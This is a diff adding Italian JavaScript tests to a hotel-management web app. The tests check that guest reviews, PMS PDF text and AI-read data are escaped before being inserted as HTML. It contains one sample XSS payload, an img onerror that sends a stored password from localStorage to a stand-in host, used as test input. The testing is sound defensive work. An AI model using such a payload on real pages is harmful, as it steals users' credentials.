@@ -2615,3 +2615,31 @@ ok('vince la copia corretta altrove (mod piu\' recente)', _qmUnisciRecord([{id:'
 ok('senza mod si guarda ts come prima',                   _qmUnisciRecord([{id:'m',q:5,ts:100}],[{id:'m',q:9,ts:100}])[0].q, 9);
 ok('la correzione di giacenza non tocca l\'ordine (ts)',  /m\.mod=Date\.now\(\)/.test(String(giacCorreggi))&&!/m\.ts=Date\.now\(\)/.test(String(giacCorreggi)), true);
 ok('correggere un reso segna la modifica',                /r\.mod=Date\.now\(\)/.test(String(resiEditQta)), true);
+
+// ── Sicurezza (26/09/2026): i testi scritti da fuori non diventano codice sulla pagina ──
+//    Recensioni (le scrive l'ospite), PDF del PMS (il nome con cui si prenota), dati letti
+//    dall'AI, data della mail di risposta: tutto finiva in innerHTML così com'era, e un
+//    <img onerror=…> sarebbe stato eseguito col lasciapassare della postazione.
+sez('Sicurezza: testi esterni senza codice');
+var _xss = '<img src=x onerror="fetch(`//x.y/`+localStorage.qm_pass)">';
+var _pul = _qmPulisciTesti({ arrivi: [{ ospite: 'Mario ' + _xss, pax: 2 }], data: '26/09' });
+ok('AI/PMS: niente < > " ` nei nomi',          /[<>"`]/.test(_pul.arrivi[0].ospite), false);
+ok('AI/PMS: il nome resta leggibile',          _pul.arrivi[0].ospite.indexOf('Mario ') === 0, true);
+ok('AI/PMS: i numeri restano numeri',          _pul.arrivi[0].pax, 2);
+ok('AI/PMS: l\'apostrofo di O\'Neil resta',     _qmPulisciTesti("O'Neil"), "O'Neil");
+(function () {
+  var tc = { items: [{ str: 'Rossi ' + _xss }, { str: 'DBL' }] }, visto = null;
+  // Promesse finte e sincrone: il harness non aspetta quelle vere.
+  function T(v) { return { then: function (f) { return T(f(v)); } }; }
+  var doc = { getPage: function () { return T({ getTextContent: function () { return T(tc); } }); } };
+  _pdfSenzaCodice(doc).getPage(1).then(function (pg) { pg.getTextContent().then(function (t) { visto = t.items.map(function (i) { return i.str; }).join('|'); }); });
+  ok('PDF: il testo estratto perde i tag',     /[<>"`]/.test(visto), false);
+  ok('PDF: il resto del testo intatto',        /\|DBL$/.test(visto), true);
+})();
+ok('PDF: ogni PDF passa dal filtro',           /\.then\(_pdfSenzaCodice\)/.test(String(_pdfApri)), true);
+ok('Booking: testo positivo protetto',          /_esc\(r\['Recensione positiva'\]\)/.test(String(revRenderList)), true);
+ok('Booking: testo negativo protetto',          /_esc\(r\['Recensione negativa'\]\)/.test(String(revRenderList)), true);
+ok('Booking: nome e titolo protetti',           /_esc\(r\["Nome dell'ospite"\]\)/.test(String(revRenderList)) && /_esc\(r\['Titolo della recensione'\]\)/.test(String(revRenderList)), true);
+ok('Booking: risposta della struttura protetta', /_esc\(replyText/.test(String(revRenderList)) && /_esc\(fullText\)/.test(String(revToggleReply)), true);
+ok('Booking: traduzione protetta',              /_esc\(posM\[1\]/.test(String(revTranslate)) && /_esc\(negM\[1\]/.test(String(revTranslate)), true);
+ok('Expedia: nome, titolo, testo protetti',     /_esc\(r\['review_by'\]\)/.test(String(revExpRenderList)) && /_esc\(reviewTxt\)/.test(String(revExpRenderList)) && /_esc\(r\['review_title'\]\)/.test(String(revExpRenderList)), true);
